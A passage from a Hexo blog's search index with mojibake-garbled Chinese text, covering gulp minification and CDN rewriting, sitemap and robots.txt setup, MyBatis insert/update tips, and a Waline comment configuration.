¹æ®éœ€æ±‚è‡ªå®šä¹‰</li></ol></blockquote><details green><summary> gulpfile.js </summary>              <div class='content'>              <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> gulp <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> minifycss <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-minify-css'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> htmlmin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-html-minifier-terser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// var uglify = require('gulp-uglify');</span><span class="token keyword">var</span> htmlclean <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-htmlclean'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> terser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-terser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> replace <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'gulp-replace'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å‹ç¼©cssæ–‡ä»¶</span><span class="token keyword">const</span> <span class="token function-variable function">minify_css</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>    gulp<span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./public/**/*.css'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">minifycss</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            compatibility<span class="token operator">:</span> <span class="token string">'ie8'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">// .pipe(minifycss())</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'./public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å‹ç¼©htmlæ–‡ä»¶</span><span class="token keyword">const</span> <span class="token function-variable function">minify_html</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>    gulp<span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./public/**/*.html'</span><span class="token punctuation">,</span><span class="token string">'!./public/&#123;lib,lib/**&#125;'</span><span class="token punctuation">,</span><span class="token string">'!./public/**.xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'src="/js/'</span><span class="token punctuation">,</span> <span class="token string">'src="https://sizaif.com/js/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'href="/css/"'</span><span class="token punctuation">,</span> <span class="token string">'href="https://sizaif.com/css/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'../img/img_article'</span><span class="token punctuation">,</span> <span class="token string">'https://sizaif.com/img/img_article/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlclean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlmin</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            removeComments<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            minifyJS<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            minifyCSS<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            minifyURLs<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'./public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">minify_html_jsd</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>    gulp<span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./public/**/*.html'</span><span class="token punctuation">,</span><span class="token string">'!./public/&#123;lib,lib/**&#125;'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'src="/js/'</span><span class="token punctuation">,</span> <span class="token string">'src="https://cdn.jsdelivr.net/gh/sizaif/blog-cdn@main/js/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'href="/css/"'</span><span class="token punctuation">,</span> <span class="token string">'href="https://cdn.jsdelivr.net/gh/sizaif/blog-cdn@main/css/"'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'../img/img_article'</span><span class="token punctuation">,</span> <span class="token string">'https://cdn.jsdelivr.net/gh/sizaif/blog-cdn@main/img/img_article'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlclean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlmin</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            removeComments<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            minifyJS<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            minifyCSS<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>            minifyURLs<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'./public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// å‹ç¼©jsæ–‡ä»¶</span><span class="token keyword">const</span> <span class="token function-variable function">minify_js</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>    gulp<span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./public/**/*.js'</span><span class="token punctuation">,</span> <span class="token string">'!./public/**/*.min.js'</span><span class="token punctuation">,</span><span class="token string">'!./public/&#123;lib,lib/**&#125;'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">terser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">// .pipe(uglify())</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'./public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    minify_html<span class="token operator">:</span> minify_html<span class="token punctuation">,</span>    minify_css<span class="token operator">:</span> minify_css<span class="token punctuation">,</span>    minify_js<span class="token operator">:</span> minify_js<span class="token punctuation">,</span>    minify_html_jsd<span class="token operator">:</span> minify_html_jsd<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span> gulp<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span>    minify_html<span class="token punctuation">,</span>    minify_css<span class="token punctuation">,</span>    minify_js<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">'two'</span><span class="token punctuation">,</span> gulp<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span>    minify_html_jsd<span class="token punctuation">,</span>    minify_css<span class="token punctuation">,</span>    minify_js<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">'default'</span><span class="token punctuation">,</span> gulp<span class="token punctuation">.</span><span class="token function">series</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>              </div>            </details><h4 id="è¿è¡Œ">è¿è¡Œ</h4><p>ä½¿ç”¨gulpå, å‘å¸ƒæ¨é€(<code>hexo d</code>)å‰éœ€è¦æ·»åŠ ä¸€ä¸ªå‘½ä»¤</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä¸ä½¿ç”¨cdn</span>$ hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> gulp <span class="token operator">&amp;&amp;</span> hexo d<span class="token comment"># ä½¿ç”¨cdné‡å®šå‘</span>$ hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> gulp two <span class="token operator">&amp;&amp;</span> hexo d</code></pre><h3 id="SEO-sitemap">SEO-sitemap</h3><h4 id="å®‰è£…æ’ä»¶">å®‰è£…æ’ä»¶</h4><p><strong>ç™¾åº¦</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> hexo-generator-baidu-sitemap --save</code></pre><p><strong>è°·æ­Œ</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> hexo-generator-sitemap --save</code></pre><h4 id="ç¼–è¾‘ä¸»ç«™-config-yml">ç¼–è¾‘ä¸»ç«™_config.yml</h4><p>æ·»åŠ ä»£ç </p><pre class="language-yml" data-language="yml"><code class="language-yml"><span class="token comment">## ======================================================= #</span><span class="token comment">## ==ä¸‰ã€SEO ä¼˜åŒ–äºŒç½‘ç«™åœ°å›¾ npm install hexo-generator-sitemap --save====== #</span><span class="token comment">## npm install hexo-generator-baidu-sitemap --save</span><span class="token comment">## ======================================================= #</span><span class="token key atrule">sitemap</span><span class="token punctuation">:</span>  <span class="token key atrule">path</span><span class="token punctuation">:</span> sitemap.xml<span class="token comment">#  tag: true</span><span class="token comment">#  category: true</span><span class="token key atrule">baidusitemap</span><span class="token punctuation">:</span>  <span class="token key atrule">path</span><span class="token punctuation">:</span> baidusitemap.xml</code></pre><h4 id="é‡æ–°éƒ¨ç½²">é‡æ–°éƒ¨ç½²</h4><p>ä¼šåœ¨<code>public</code>ç›®å½•ä¸‹ç”Ÿæˆ:</p><p><code>sitemap.xml -&gt; è°·æ­Œ</code></p><p><code>baidusitemap.xml -&gt; ç™¾åº¦</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ hexo clean <span class="token operator">&amp;&amp;</span> hexo g</code></pre><p>ç„¶ååˆ†åˆ«å»å¯¹äºç«™ç‚¹ç½‘ç«™æäº¤å³å¯</p><div class="tag link"><a class="link-card" title="ç™¾åº¦ç«™ç‚¹ç®¡ç†" href="https://ziyuan.baidu.com/site/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">ç™¾åº¦ç«™ç‚¹ç®¡ç†</p><p class="url">https://ziyuan.baidu.com/site/</p></div></a></div><div class="tag link"><a class="link-card" title="è°·æ­Œç«™ç‚¹ç®¡ç†" href="https://search.google.com/search-console/about"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">è°·æ­Œç«™ç‚¹ç®¡ç†</p><p class="url">https://search.google.com/search-console/about</p></div></a></div><h3 id="robots-txtæ–‡ä»¶">robots.txtæ–‡ä»¶</h3><blockquote><p>robots.txtæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ç½‘ç«™ç®¡ç†è€…å¯ä»¥å£°æ˜è¯¥ç½‘ç«™ä¸­ä¸æƒ³è¢«robotsè®¿é—®çš„éƒ¨åˆ†ï¼Œæˆ–è€…æŒ‡å®šæœç´¢å¼•æ“åªæ”¶å½•æŒ‡å®šçš„å†…å®¹ã€‚</p><p>å½“ä¸€ä¸ªæœç´¢æœºå™¨äººï¼ˆæœ‰çš„å«æœç´¢èœ˜è››ï¼‰è®¿é—®ä¸€ä¸ªç«™ç‚¹æ—¶ï¼Œå®ƒä¼šé¦–å…ˆæ£€æŸ¥è¯¥ç«™ç‚¹æ ¹ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨robots.txtï¼Œå¦‚æœå­˜åœ¨ï¼Œæœç´¢æœºå™¨äººå°±ä¼šæŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹æ¥ç¡®å®šè®¿é—®çš„èŒƒå›´ï¼›å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆæœç´¢æœºå™¨äººå°±æ²¿ç€é“¾æ¥æŠ“å–ã€‚</p><p>å¦å¤–ï¼Œrobots.txtå¿…é¡»æ”¾ç½®åœ¨ä¸€ä¸ªç«™ç‚¹çš„æ ¹ç›®å½•ä¸‹ï¼Œè€Œä¸”æ–‡ä»¶åå¿…é¡»å…¨éƒ¨å°å†™ã€‚</p></blockquote><p>åœ¨<code>source</code> ç›®å½•ä¸‹ æ–°å»º <code>robots.txt</code></p><p>åŸŸåæ”¹æˆè‡ªå·±çš„</p><details green><summary> robots.txt </summary>              <div class='content'>              <pre class="language-txt" data-language="txt"><code class="language-txt"># robots.txt www.sizaif.comUser-agent: * Allow: /sitemap.xmlAllow: /baidusitemap.xmlAllow: /category-sitemap.xmlAllow: /page-sitemap.xmlAllow: /post-sitemap.xmlAllow: /tag-sitemap.xmlAllow: /posts/Disallow: /cssDisallow: /jsDisallow: /fontsDisallow: /imgDisallow: /fontsDisallow: /pageDisallow: /navigationDisallow: /tagsDisallow: /archivesDisallow: /404.htmlDisallow: /403.htmlDisallow: /update.logDisallow: /search.xmlDisallow: /README.md</code></pre>              </div>            </details></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ƒå¤•-æ‚è°ˆ</title>
      <link href="/posts/52b019f9/"/>
      <url>/posts/52b019f9/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/sizaif/images/raw/master/img/20210814173546.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210814173546.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt=""></p><p><strong>é€ç»™æ¯ä¸€å¯¹ç”œç”œèœœèœœçš„ä½ ä»¬!</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis Insert æ’å…¥æ—¶æ‹¿åˆ°è‡ªå¢çš„ä¸»é”®ID</title>
      <link href="/posts/eabbfbf/"/>
      <url>/posts/eabbfbf/</url>
      
        <content type="html"><![CDATA[<p><strong>useGeneratedKeys=â€œtrueâ€ : æ˜¯å¦å¼€å¯ç”Ÿæˆä¸»é”®</strong></p><p><strong>keyColumn=â€œæ•°æ®åº“ä¸­ä¸»é”®åç§°â€</strong></p><p><strong>eyProperty=â€œ(å®ä½“ç±»ä¸­ä¸»é”®å¯¹åº”çš„åç§°æˆ–è€…è‡ªå®šä¹‰åç§°)â€&gt;</strong></p><p>å¦‚æœä½ ä¼ å…¥çš„å‚æ•°æ˜¯<strong>å®ä½“ç±»</strong>, é‚£ä¹ˆè¯·æ³¨æ„keyProperty å¯¹åº”çš„åº”è¯¥æ˜¯å®ä½“ç±»ä¸­çš„ä¸»é”®ID;</p><p>å¦‚æœä½ ä¼ å…¥çš„å‚æ•°æ˜¯<strong>map</strong>,é‚£ä¹ˆå°±å¯ä»¥è‡ªå®šä¹‰åç§°.</p><p><strong>æ³¨æ„:æ–°æ·»åŠ ä¸»é”®idå¹¶ä¸æ˜¯åœ¨æ‰§è¡Œæ·»åŠ æ“ä½œæ—¶ç›´æ¥è¿”å›çš„ï¼Œè€Œæ˜¯åœ¨æ‰§è¡Œæ·»åŠ æ“ä½œä¹‹åå°†æ–°æ·»åŠ è®°å½•çš„ä¸»é”®idå­—æ®µè¿”å›åˆ°ä¼ å…¥çš„å‚æ•°ç±»ä¸­.</strong></p><p>ä¾‹å¦‚:</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>insert</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>addUser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>map<span class="token punctuation">"</span></span> <span class="token attr-name">useGeneratedKeys</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">keyColumn</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">keyProperty</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        INSERT INTO saishiguanli.users        (createDate, modifyDate, isEnabled, isLocked, lastLoginDate, lastLoginIp, lockDate, name, encodePassword)        VALUES        (#&#123;createDate&#125;,#&#123;modifyDate&#125;,#&#123;isEnabled&#125;,#&#123;isLocked&#125;,#&#123;lastLoginDate&#125;,#&#123;lastLoginIp&#125;,#&#123;lockDate&#125;,#&#123;name&#125;,#&#123;encodePassword&#125;)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>insert</span><span class="token punctuation">></span></span></code></pre><pre class="language-java" data-language="java"><code class="language-java">è°ƒç”¨addUseræ–¹æ³•å<span class="token keyword">int</span> id <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ä¾¿å¯ä»¥å–å¾—ä¸»é”®ID<span class="token punctuation">;</span></code></pre><p><strong>è‹¥ ä¼ å…¥çš„æ˜¯å®ä½“ç±», é‚£ä¹ˆè°ƒç”¨æ–¹æ³•å int id = user.getId(); å³å¯</strong></p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatisä¸­updateä½¿ç”¨åŠ¨æ€SQLè¯­å¥</title>
      <link href="/posts/119fdf75/"/>
      <url>/posts/119fdf75/</url>
      
        <content type="html"><![CDATA[<p><strong>è®°ä¸ªç¬”è®°:mybatisé‡åˆ°çš„å‘</strong></p><p>Mybatis è¿›è¡ŒUpdate æ“ä½œæ—¶;</p><p>æœ‰çš„æ•°æ®ä¸ä¸€å®šè¦è¿›è¡Œä¿®æ”¹,å› æ­¤ä»å‰å°ä¼ è¿‡æ¥çš„æ•°æ®,æŸäº›é¡¹å¯èƒ½ä¸ºnull;</p><p>åœ¨è¿›è¡Œsql è¯­å¥æ—¶ å°±ä¼šè¿›è¡Œå¼‚å¸¸;å¯¼è‡´æ“ä½œå¤±è´¥;</p><p>æ‰€ä»¥è¿›è¡ŒåŠ¨æ€SQLè¯­å¥æ‹¼æ¥:</p><p>åœ¨UserMapper.xmlä¸­ æ›´æ”¹:Mybatisä¸­updateä½¿ç”¨åŠ¨æ€SQLè¯­å¥</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>update</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>updateUser<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>map<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    update saishiguanli.user    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>trim</span> <span class="token attr-name">prefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>set<span class="token punctuation">"</span></span> <span class="token attr-name">suffixOverrides</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>,<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ulevel!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ulevel=#&#123;ulevel&#125;,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ugender!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ugender=#&#123;ugender&#125;,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uname!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>uname=#&#123;uname&#125;,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upwd!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>upwd=#&#123;upwd&#125;,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>unickname!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>unickname=#&#123;unickname&#125;,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uimage!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>uimage=#&#123;uimage&#125;,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uphone!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>uphone=#&#123;uphone&#125;,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ucreatetime!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ucreatetime=#&#123;ucreatetime&#125;,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>trim</span><span class="token punctuation">></span></span>    where uid = #&#123;uid&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>update</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³Walineä½¿ç”¨å›¾ç‰‡ä¸Šä¼ å›¾åºŠè·¨åŸŸé”™è¯¯é—®é¢˜</title>
      <link href="/posts/db8bf7ad/"/>
      <url>/posts/db8bf7ad/</url>
      
        <content type="html"><![CDATA[<blockquote><p>@auther by sizaf</p></blockquote><h2 id="é”™è¯¯æè¿°">é”™è¯¯æè¿°:</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210813100846.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210813100846.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210813100844769"></p></div><h2 id="è¯´æ˜">è¯´æ˜</h2><div class="story post-story"><ol><li>æˆ‘é‡‡ç”¨çš„æ˜¯Volantis ä½œä¸ºä¸»é¢˜</li></ol><p>åœ¨ä¸»é¢˜<code>_config.yml</code> æ–‡ä»¶ä¸­</p><p>ä¿®æ”¹waline é…ç½®</p><pre class="language-stylus" data-language="stylus"><code class="language-stylus">waline<span class="token punctuation">:</span>  <span class="token property-declaration"><span class="token property">js</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token comment">//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js</span></span>  <span class="token property-declaration"><span class="token property">path</span><span class="token punctuation">:</span> # å…¨å±€è¯„è®ºåœ°å€ ç›®å‰è®¾ç½®å…¨å±€è¯„è®ºåœ°å€åvisitorå¤±æ•ˆ<span class="token punctuation">,</span>è¿™æ˜¯walineçš„é—®é¢˜</span>  <span class="token property-declaration"><span class="token property">placeholder</span><span class="token punctuation">:</span> å…è®¸åŒ¿åè¯„è®ºï¼Œè¯„è®ºæ”¯æŒè´´å›¾ï¼Œå¤§å®¶åœ¨æˆªå›¾åï¼Œåœ¨è¯„è®ºæ¡†ç²˜è´´ï¼Œè‡ªåŠ¨ä¼ è‡³å›¾åºŠï¼Œæ¬¢è¿ä½¿ç”¨ä½“éªŒ<span class="token operator">~</span>  # è¯„è®ºå ä½æç¤º</span>  <span class="token property-declaration"><span class="token property">imageHosting</span><span class="token punctuation">:</span> https<span class="token punctuation">:</span><span class="token comment">//7bu.top/api/upload # å›¾åºŠapiã€Œé»˜è®¤ä½¿ç”¨å»ä¸å›¾åºŠã€</span></span>  # å…¶ä»–é…ç½®é¡¹æŒ‰ç…§ymlæ ¼å¼ç»§ç»­å¡«å†™å³å¯ é™¤äº† <span class="token punctuation">[</span>el path placeholder uploadImage<span class="token punctuation">]</span> é€‰é¡¹  <span class="token property-declaration"><span class="token property">meta</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>nick<span class="token 